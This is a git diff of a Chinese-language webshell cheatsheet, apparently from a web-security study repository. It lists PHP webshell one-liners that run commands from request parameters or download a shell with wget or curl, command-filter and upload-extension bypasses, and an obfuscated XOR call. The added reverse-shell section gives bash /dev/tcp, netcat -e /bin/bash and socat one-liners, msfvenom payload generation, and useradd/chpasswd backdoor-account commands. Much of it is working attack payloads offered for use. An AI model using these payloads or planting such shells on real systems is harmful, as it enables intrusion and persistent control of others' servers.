@@ -12,7 +12,8 @@
 *  [Webshell cheatsheet](#webshell-cheatsheet)  
 *  [Bypass blacklist extension](#bypass-blacklist-extension)  
 *  [SQL inj to webshell](#sql-inj-to-webshell)  
-*  [Don't delete my webshell](#dont-delete-my-webshell)
+*  [Don't delete my webshell](#dont-delete-my-webshell)  
+*  [Reverse shell](#reverse-shell)  
 *  [Reference](#reference)
 
 # How works
@@ -37,7 +38,7 @@ cat f*
 cat${IFS}flag
 cat$IFSflag
 IFS=,;`cat<<<cat,flag`    // 將,指定為分割符，將 cat,flag 作為輸入提供給 cat
-cat<flag          // 使cmd從file讀入
+cat< flag          // 使cmd從file讀入
 ```
    
 # Webshell cheatsheet
@@ -52,13 +53,13 @@ cat<flag          // 使cmd從file讀入
 
 
 // 不回顯
-<?php shell_exec('echo 1>1');        // 1=echo 1>1
-<?php shell_exec('>1');            // 1=>1
+<?php shell_exec('echo 1>1'); ?>        // 1=echo 1>1
+<?php shell_exec('>1');    ?>        // 1=>1
 
-<?php shell_exec('wget -O 1.php url');    // download shell
-<?php shell_exec('curl -o 1.php url');    // 預設下載index.html
+<?php shell_exec('wget -O 1.php url');   ?> // download shell
+<?php shell_exec('curl -o 1.php url');  ?>  // 預設下載index.html
 
-<?=`$_GET[1]`;                   // <?= is used to shorten the <?php echo `blah`;
+<?=`$_GET[1]`;          ?>         // <?= is used to shorten the <?php echo `blah`;
 // ``就像exec不會直接顯示結果，需要echo
 echo `$_GET[1]`;&1=ls
 
@@ -76,10 +77,10 @@ include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 
 
 // PHP代碼執行
-<?php eval('echo `ls`;');       // eval裡的PHP代碼必須加;
-<?php assert('phpinfo();');    // assert裡的PHP代碼可以不加;
+<?php eval('echo `ls`;');    ?>   // eval裡的PHP代碼必須加;
+<?php assert('phpinfo();');   ?> // assert裡的PHP代碼可以不加;
 
-<?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  // ？str=[phpinfo()]
+<?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  ?> // ？str=[phpinfo()]
 // 必須有匹配才會執行
 // PHP 5.5起，會產生 E_DEPRECATED 錯誤
 // PHP 7.0.0後，必須使用 preg_replace_callback() 代替
@@ -99,7 +100,6 @@ param=usort(...$_GET);
 [這是一篇很屌的php lib exp分析](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  
 
 ```php
-<?=
 $😊 = "||||%-" ^ "/%/(``"; 
 $😊 ("`|" ^ ",/");
 ```
@@ -108,23 +108,23 @@ $😊 ("`|" ^ ",/");
 
 # Bypass blacklist extension
 文件解析漏洞  
-除了```.php```，通過conf模塊的regular expression：  
-* ```.php3```  
-* ```.php4```  
-* ```.php5```  
-* ```.php7```  
-* ```.pht```  
-* ```.phtml```  
-以上副檔名也都會被解析成```.php```  
-* ```.php.xxx```  
+除了`.php`，通過conf模塊的regular expression：  
+* `.php3`  
+* `.php4`  
+* `.php5`  
+* `.php7`  
+* `.pht`  
+* `.phtml`  
+以上副檔名也都會被解析成`.php`  
+* `.php.xxx`  
 在古老的版本中也存在**多後綴名**的繞過方式  
 原理：apache2特性由右至左解析，遇到不認識的無法解析就像左跳！  
-* ```.php/.``` 
+* `.php/.` 
 值得注意的是 這招無法覆蓋舊檔  
-原理：php源碼中可以看到用遞歸的方式將檔名結尾的```/.```都去掉！  
+原理：php源碼中可以看到用遞歸的方式將檔名結尾的`/.`都去掉！  
 [源碼審計](https://github.com/shinmao/Web-Security-Learning/blob/master/Webshell/apache2_php5.conf)  
-* ```move_uploaded_file()```  
-配合lstat()在這個函式中的使用，可以突破```/.```沒辦法覆蓋舊檔的限制。  
+* `move_uploaded_file()`  
+配合lstat()在這個函式中的使用，可以突破`/.`沒辦法覆蓋舊檔的限制。  
 [參考自家筆記](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)
 
 # SQL inj to webshell
@@ -150,7 +150,48 @@ register_shutdown_function($e, $_REQUEST['pass']);
 $e = $_REQUEST['e'];
 declare(ticks=1);
 register_tick_function ($e, $_REQUEST['pass']);
+?>
+```  
+# Reverse shell
+目標為內網主機，外網無法發起連接。反彈shell就是webshell發起一個shell到外網，就可獲得目標的shell控制環境。  
+1. bash一句話  
+```php
+bash -i >& /dev/tcp/target_ip/8080 0>&1
+```  
+`>&`表示聯合符號前面的內容與後面結合，重定向給後者。`0>&1`表示將`std_input`與`std_output`結合，然後重定向給`std_output`。  
+2. netcat一句話  
+```php
+// 外網主機
+nc -lvvp 8080   // 監聽8080port
+nc target_ip 8080 -t -e /bin/bash
 ```
+建立連結後執行`/bin/bash`  
+3. socat  
+```php
+socat tcp-listen:8080 -
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:target_ip:8080
+```  
+4. python, php, java, perl  
+http://www.03sec.com/3140.shtml  
+5. msfvenom獲取payload  
+```php
+msfvenom -l payloads cmd/unix/reverse
+// 會羅列出所有反彈腳本
+msfvenom -p cmd/unix/xxxx lhost=target_ip lport=target_port R
+```  
+  
+若反彈shell交互性非常差  
+1. 添加使用者  
+```php
+useradd new;echo 'new:password'|chpasswd
+useradd new;echo -e 'xxxxxxx' |passwd test
+```  
+2. python獲取標準shell  
+```php
+python -c "import pty;pty.spawn('/bin/bash')"
+```  
+
+reference from [安全客](https://www.anquanke.com/post/id/87017)
 
 ### Reference  
 * [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
